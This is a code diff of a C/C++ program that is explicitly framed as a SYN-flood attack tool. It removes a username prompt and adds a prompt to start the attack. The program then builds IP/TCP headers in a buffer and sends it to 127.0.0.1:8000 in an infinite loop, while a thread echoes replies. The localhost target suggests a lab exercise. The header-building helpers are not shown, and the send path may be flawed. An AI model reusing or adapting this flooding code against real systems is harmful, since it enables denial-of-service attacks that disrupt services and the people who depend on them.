@@ -13,44 +13,43 @@
 
 #include "libs/utils.cpp"
 
-void *receive(void *arg) {
-	int *server = (int *)arg;
-	char msg[256];
-	int ct = 0;
+void* receive(void* arg) {
+    char msg[256];
+    int ct = 0;
 
-	while (1) {
-		int err = recv(*server, msg, 255, 0);
+    while (true) {
+        int err = recv(*(int*)arg, msg, 255, 0);
 
-		if (err > 0) {
-			msg[255] = '\0';
-			printf("%s", msg);
-			ct++;
+        if (err > 0) {
+            msg[255] = '\0';
+            std::cout << msg;
+            ct++;
 
-			if (ct > 2000)
-				break;
-		}
+            if (ct > 2000)
+                break;
+        }
 
-		if (err == 0) {
-			break;
-		}
+        if (err == 0) {
+            break;
+        }
 
-		if (err == -1)
-			handle_error_en(-1, "recv");
-	}
+        if (err == -1)
+            handle_error_en(-1, "recv");
+    }
 
-	pthread_exit(0);
+    pthread_exit(0);
 }
 
 int main(int argc, char **argv) {
 	char datagram[4096], source_ip[32];
 
 	strcpy(source_ip, "127.0.0.1");
-	memset(datagram, 0, 4096); /* zero out the buffer */
+	memset(datagram, 0, 4096);
 
 	struct sockaddr_in sin;
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons(8000);
-	sin.sin_addr.s_addr = inet_addr("127.0.0.1");
+	sin.sin_addr.s_addr = inet_addr(source_ip);
 
 	auto iph = fillIPHeader(datagram, source_ip, sin);
 	auto tcph = fillTCPHeader(datagram);
@@ -74,16 +73,14 @@ int main(int argc, char **argv) {
 
 	if (socket_descr == -1)
 		handle_error_en(-1, "socket");
-
+	
 	struct sockaddr_in server_sa;
 	server_sa.sin_family = AF_INET;
 	server_sa.sin_port = htons(8000);
-	std::cout << server_sa.sin_port << std::endl;
-	server_sa.sin_addr.s_addr = inet_addr("127.0.0.1");
-	char user_name[14];
+	server_sa.sin_addr.s_addr = inet_addr(source_ip);
 
-	printf("Username: ");
-	scanf("%s", user_name);
+	std::cout << "Press Enter to start SYN-flood attack..." << std::endl;
+    std::cin.ignore();
 
 	if (connect(socket_descr, (struct sockaddr *)&server_sa, sizeof(server_sa)) == -1)
 		handle_error_en(-1, "connect");
@@ -94,9 +91,8 @@ int main(int argc, char **argv) {
 	if (err != 0)
 		handle_error_en(err, "pthread_create");
 
-	int ctr = 0;
 
-	while (1) {
+	while (true) {
 		send(socket_descr, datagram, strlen(datagram), 0);
 	}
 
